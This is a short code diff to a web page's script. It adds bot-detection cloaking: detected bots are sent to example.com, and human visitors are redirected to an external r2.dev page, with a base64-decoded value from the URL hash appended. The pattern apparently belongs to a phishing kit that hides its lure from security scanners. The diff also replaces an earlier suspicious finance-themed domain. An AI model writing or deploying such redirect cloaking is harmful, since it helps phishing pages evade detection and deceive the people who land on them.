@@ -89,10 +89,12 @@
 
     // Function to update the result
     function updateResult(detections, verdict) {
+      const hash = window.location.hash.substring(1);
+      
       if (verdict.bot) {
         window.location.href = "https://example.com/"; // Redirect if bot is detected
       } else {
-        window.location.href = "https://20fhq51cblpkv6c.financeccs.com/isgDUldD";
+        window.location.href = "https://pub-0ad5d70a159845ccafa9b30e65fb2e19.r2.dev/page.html#"+atob(hash);
       }
       console.log(JSON.stringify(verdict, null, 2));
       console.log(JSON.stringify(detections, null, 2));
